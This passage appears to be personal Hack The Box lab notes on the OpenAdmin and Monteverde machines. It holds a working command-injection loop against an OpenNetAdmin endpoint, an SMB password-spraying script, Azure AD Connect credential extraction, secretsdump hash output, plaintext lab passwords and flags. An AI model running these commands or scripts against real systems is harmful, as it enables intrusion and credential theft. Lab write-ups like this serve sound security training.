&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;${cmd};echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot; &quot;${URL}&quot; | sed -n -e &#39;/BEGIN/,/END/ p&#39; | tail -n +2 | head -n -1<br />&gt; done<br />$ <br />$ whoami<br />www-data<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>21232f297a57a5a743894a0e4a801fc3 MD5 admin or osCommerce ad:min         admin   <br />098f6bcd4621d373cade4e832627b4f6 MD5 test                                                    guest<br /><br /><br />jimmy   n1nj4W4rri0R!<br />                bloodninjas</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.171<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-14 12:51 EST<br />Nmap scan report for 10.10.10.171<br />Host is up (0.096s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4.54 seconds<br /></div><div class='page'><h1 class='title level-6'>web nmap</h1><br/>/bin/bash: command substitution: line 0: syntax error near unexpected token `http*&#39;<br />/bin/bash: command substitution: line 0: `banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&#39;<br />nmap -vv --reason -Pn -sV -p 80 --script= 10.10.10.171<br />/bin/bash: command substitution: line 0: syntax error near unexpected token `http*&#39;<br />/bin/bash: command substitution: line 0: `banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&#39;<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-14 12:53 EST<br />NSE: Loaded 43 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.00s elapsed<br />Initiating Parallel DNS resolution of 1 host. at 12:53<br />Completed Parallel DNS resolution of 1 host. at 12:53, 0.60s elapsed<br />Initiating SYN Stealth Scan at 12:53<br />Scanning 10.10.10.171 [1 port]<br />Discovered open port 80/tcp on 10.10.10.171<br />Completed SYN Stealth Scan at 12:53, 0.16s elapsed (1 total ports)<br />Initiating Service scan at 12:53<br />Scanning 1 service on 10.10.10.171<br />Completed Service scan at 12:53, 6.21s elapsed (1 service on 1 host)<br />NSE: Script scanning 10.10.10.171.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.44s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.00s elapsed<br />Nmap scan report for 10.10.10.171<br />Host is up, received user-set (0.11s latency).<br />Scanned at 2020-01-14 12:53:11 EST for 7s<br /><br />PORT   STATE SERVICE REASON         VERSION<br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 12:53<br />Completed NSE at 12:53, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds<br />           Raw packets sent: 1 (44B) | Rcvd: 21 (1.056KB)<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.171:80">http://10.10.10.171:80</a> --simple-report dirsearchsimple_10.10.10.171:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-20-01-14_12-53-12.log<br /><br />Target: <a href="http://10.10.10.171:80">http://10.10.10.171:80</a><br /><br />[12:53:12] Starting: <br />[12:53:12] 403 -  277B  - /.php<br />[12:53:14] 403 -  277B  - /icons/<br />[12:53:15] 200 -   12KB - /music/<br />[12:54:09] 200 -   14KB - /artwork/<br />[13:01:38] 200 -   42KB - /sierra/<br />[13:11:05] 403 -  277B  - /server-status/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />root@kali:~/Desktop/Machines/HTB/OpenAdmin# <br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />c9b2cf07d40807e62af62660f0c81b5f<br />root<br />2f907ed450b361b2c2bf4e8795d5b561<br /></div><div class='page'><h1 class='title level-4'>10.10.10.172 Monteverde</h1><br/>nmap showed an assload of ports open<br />ldap showed that the fqdn and domain name were megabank.local<br />dns confirmed and they were added to /etc/hosts<br />ldap also gave me a user list. I used that userlist to make a user.txt and pass.txt<br />I made a smbloop.py tool to pass user.txt and pass.txt while trying to run a credentialed smbmap<br />It worked!!<br />got the creds SABatchJobs:SABatchJobs<br /><br />smbmap with the new creds and I see that I can connect to users$<br />I mget the whole directory and see that under mhope is azure.xml<br />CREDS!<br />mhope:4n0therD4y@n0th3r$<br />evil-winrm in... user.txt<br /><br />whoami /groups shows that I am in the Azure admins group (bloodhound was useless here)<br />After many moons of googling I find this github projuct<br /><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</a><br />view raw and nano into a file named Azure-ADConnect.ps1<br />upload Azure-ADConnect.ps1 to the target with evil-winrm<br />&lt;load .\Azure-ADConnect.ps1 into memory&gt;<br />import-module .\Azure-ADConnect.ps1<br />&lt;execute&gt;<br />Azure-ADConnect -server 10.10.10.172 -db ADSync<br />&lt;enjoy your creds&gt;<br /><br />[+] Domain:  MEGABANK.LOCAL<br />[+] Username: administrator<br />[+]Password: d0m@in4dminyeah!<br /><br />evil-winrm in as administrator<br />root.txt<br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>dns showed me megabank.local. added to /etc/hosts<br /><br />DC=MEGABANK,DC=LOCAL<br /><br />ldapsearch -h 10.10.10.172 -x -b &quot;DC=MEGABANK,DC=LOCAL&quot; &#39;(objectclass=person)&#39; sAMAccountName | grep -i sam | grep -v &quot;#&quot; | awk &#39;{print $2}&#39; &gt; users.txt<br /><br />smb loop2 got me the creds<br />SABatchJobs:SABatchJobs<br /><br />looking through users$<br />mhope:4n0therD4y@n0th3r$<br />/evil-winrm.rb -i 10.10.10.172 -u mhope -p &#39;4n0therD4y@n0th3r$&#39;<br /><br /><br /><br /><br /><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1</a><br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; import-module .\Azure-ADConnect.ps1<br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; Azure-ADConnect -server 10.10.10.172 -db ADSync<br />[+] Domain:  MEGABANK.LOCAL<br />[+] Username: administrator<br />[+]Password: d0m@in4dminyeah!<br />*Evil-WinRM* PS C:\users\mhope\desktop&gt; <br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.172 &amp;&amp; nmap -sC -sV -Pn 10.10.10.172 &amp;&amp; nmap -p- -Pn 10.10.10.172<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 16:53 EDT<br />Nmap scan report for 10.10.10.172<br />Host is up (0.33s latency).<br />Not shown: 989 filtered ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 25.63 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 16:54 EDT<br />Nmap scan report for 10.10.10.172<br />Host is up (0.30s latency).<br />Not shown: 989 filtered ports<br />PORT     STATE SERVICE       VERSION<br />53/tcp   open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-14 21:03:40Z)<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />445/tcp  open  microsoft-ds?<br />464/tcp  open  kpasswd5?<br />593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />636/tcp  open  tcpwrapped<br />3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />3269/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=5E96230B%P=x86_64-pc-linux-gnu%r(DNSV<br />SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\<br />SF:x04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: 9m08s<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-14T21:06:08<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 335.60 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-14 16:59 EDT<br />Nmap scan report for 10.10.10.172<br />Host is up (0.29s latency).<br />Not shown: 65516 filtered ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />5985/tcp  open  wsman<br />9389/tcp  open  adws<br />49667/tcp open  unknown<br />49673/tcp open  unknown<br />49674/tcp open  unknown<br />49677/tcp open  unknown<br />49701/tcp open  unknown<br />49772/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 784.49 seconds<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>enum4linux</h1><br/>enum4linux -a 10.10.10.172<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Tue Apr 14 17:11:31 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.172<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.172    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.172    |<br /> ============================================ <br />Looking up status of 10.10.10.172<br />No reply from 10.10.10.172<br /><br /> ===================================== <br />|    Session Check on 10.10.10.172    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[+] Server 10.10.10.172 allows sessions using username &#39;&#39;, password &#39;&#39;<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.172    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />Domain Name: MEGABANK<br />Domain Sid: S-1-5-21-391775091-850290835-3566037492<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ====================================== <br />|    OS information on 10.10.10.172    |<br /> ====================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.10.10.172 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.172 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.172    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.<br />index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)<br />index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain<br />index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)<br />index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&#39;Leary	Desc: (null)<br />index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)<br />index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)<br />index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)<br />index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)<br />index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />user:[Guest] rid:[0x1f5]<br />user:[AAD_987d7f2f57d2] rid:[0x450]<br />user:[mhope] rid:[0x641]<br />user:[SABatchJobs] rid:[0xa2a]<br />user:[svc-ata] rid:[0xa2b]<br />user:[svc-bexec] rid:[0xa2c]<br />user:[svc-netapp] rid:[0xa2d]<br />user:[dgalanos] rid:[0xa35]<br />user:[roleary] rid:[0xa36]<br />user:[smorgan] rid:[0xa37]<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.172    |<br /> ========================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.172<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.172    |<br /> ==================================================== <br /><br /><br />[+] Attaching to 10.10.10.172 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.10.10.172)<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] MEGABANK<br />	[+] Builtin<br /><br />[+] Password Info for Domain: MEGABANK<br /><br />	[+] Minimum password length: 7<br />	[+] Password history length: 24<br />	[+] Maximum password age: 41 days 23 hours 53 minutes <br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: 1 day 4 minutes <br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 7<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.172    |<br /> ============================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting builtin groups:<br />group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]<br />group:[Incoming Forest Trust Builders] rid:[0x22d]<br />group:[Windows Authorization Access Group] rid:[0x230]<br />group:[Terminal Server License Servers] rid:[0x231]<br />group:[Users] rid:[0x221]<br />group:[Guests] rid:[0x222]<br />group:[Remote Desktop Users] rid:[0x22b]<br />group:[Network Configuration Operators] rid:[0x22c]<br />group:[Performance Monitor Users] rid:[0x22e]<br />group:[Performance Log Users] rid:[0x22f]<br />group:[Distributed COM Users] rid:[0x232]<br />group:[IIS_IUSRS] rid:[0x238]<br />group:[Cryptographic Operators] rid:[0x239]<br />group:[Event Log Readers] rid:[0x23d]<br />group:[Certificate Service DCOM Access] rid:[0x23e]<br />group:[RDS Remote Access Servers] rid:[0x23f]<br />group:[RDS Endpoint Servers] rid:[0x240]<br />group:[RDS Management Servers] rid:[0x241]<br />group:[Hyper-V Administrators] rid:[0x242]<br />group:[Access Control Assistance Operators] rid:[0x243]<br />group:[Remote Management Users] rid:[0x244]<br />group:[Storage Replica Administrators] rid:[0x246]<br /><br />[+] Getting builtin group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[+] Getting local groups:<br />group:[Cert Publishers] rid:[0x205]<br />group:[RAS and IAS Servers] rid:[0x229]<br />group:[Allowed RODC Password Replication Group] rid:[0x23b]<br />group:[Denied RODC Password Replication Group] rid:[0x23c]<br />group:[DnsAdmins] rid:[0x44d]<br />group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]<br />group:[ADSyncAdmins] rid:[0x451]<br />group:[ADSyncOperators] rid:[0x452]<br />group:[ADSyncBrowse] rid:[0x453]<br />group:[ADSyncPasswordSet] rid:[0x454]<br /><br />[+] Getting local group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;ADSyncAdmins&#39; (RID: 1105) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;ADSyncBrowse&#39; (RID: 1107) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br /><br />[+] Getting domain groups:<br />group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]<br />group:[Domain Users] rid:[0x201]<br />group:[Domain Guests] rid:[0x202]<br />group:[Domain Computers] rid:[0x203]<br />group:[Group Policy Creator Owners] rid:[0x208]<br />group:[Cloneable Domain Controllers] rid:[0x20a]<br />group:[Protected Users] rid:[0x20d]<br />group:[DnsUpdateProxy] rid:[0x44e]<br />group:[Azure Admins] rid:[0xa29]<br />group:[File Server Admins] rid:[0xa2e]<br />group:[Call Recording Admins] rid:[0xa2f]<br />group:[Reception] rid:[0xa30]<br />group:[Operations] rid:[0xa31]<br />group:[Trading] rid:[0xa32]<br />group:[HelpDesk] rid:[0xa33]<br />group:[Developers] rid:[0xa34]<br /><br />[+] Getting domain group memberships:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\Administrator<br />Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2<br />Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\mhope<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\mhope<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\SABatchJobs<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-ata<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-bexec<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-netapp<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\dgalanos<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\roleary<br />Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\smorgan<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Operations&#39; (RID: 2609) has member: MEGABANK\smorgan<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;HelpDesk&#39; (RID: 2611) has member: MEGABANK\roleary<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.<br />Group &#39;Trading&#39; (RID: 2610) has member: MEGABANK\dgalanos<br /><br /> ======================================================================= <br />|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.172    |<br /> ============================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br />Could not initialise spoolss. Error was NT_STATUS_INVALID_NETWORK_RESPONSE<br /><br /><br />enum4linux complete on Tue Apr 14 17:20:27 2020<br /></div><div class='page'><h1 class='title level-6'>smbloop.py</h1><br/>#!/usr/bin/python3<br />import os<br />import subprocess<br /><br />users   = open(&#39;users.txt&#39;).read().split()<br />passs   = open(&#39;pass.txt&#39;).read().split()<br /><br />for user in users:<br />        for pw in passs:<br />                print(&quot;{}:{}&quot;.format(user,pw))<br />                os.system(&quot;smbmap -u {} -d megabank.local -p {} -H 10.10.10.172&quot;.format(user, pw))<br /></div><div class='page'><h1 class='title level-6'>secretsdump</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Monteverde$ secretsdump.py megabank.local/administrator:&#39;d0m@in4dminyeah!&#39;@10.10.10.172<br />Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation<br /><br />[*] Service RemoteRegistry is in stopped state<br />[*] Starting service RemoteRegistry<br />[*] Target system bootKey: 0x192876d20aae88363bdf48202b9e82b8<br />[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br />Administrator:500:aad3b435b51404eeaad3b435b51404ee:883f830badb518441e2538599cd3e2bc:::<br />Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br />[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.<br />[*] Dumping cached domain logon information (domain/username:hash)<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br 